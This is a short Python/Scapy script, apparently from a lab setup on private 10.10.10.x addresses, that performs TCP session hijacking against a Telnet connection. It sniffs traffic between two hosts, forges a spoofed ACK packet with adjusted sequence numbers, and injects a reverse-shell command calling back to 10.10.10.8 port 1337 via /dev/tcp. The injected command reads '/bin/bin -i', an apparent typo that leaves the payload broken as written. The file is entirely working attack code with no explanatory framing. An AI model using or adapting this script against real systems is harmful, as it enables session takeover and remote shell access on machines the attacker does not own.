#!/usr/bin/env python3

from scapy.all import *

def sess_hijack(pkt):
    if pkt.haslayer(TCP):
        newseq = pkt[TCP].seq + 10
        newack = pkt[TCP].ack + 1
        ip = IP(src="10.10.10.6", dst="10.10.10.7")
        tcp = TCP(sport=pkt[TCP].sport, dport=23,
                flags="A", seq=newseq, ack=newack)
    
        data = "\n/bin/bin -i >/dev/tcp/10.10.10.8/1337 0<&1 2>&1\n"
        pkt = ip/tcp/data
        send(pkt, verbose=0)
        quit()

if __name__ == "__main__":
    print("Initiating session hijacking...")
    applied_filter = "tcp and src host 10.10.10.6 " \
                     "and dst host 10.10.10.7 " \
                     "and dst port 23"
    sniff(filter=applied_filter, prn=sess_hijack)
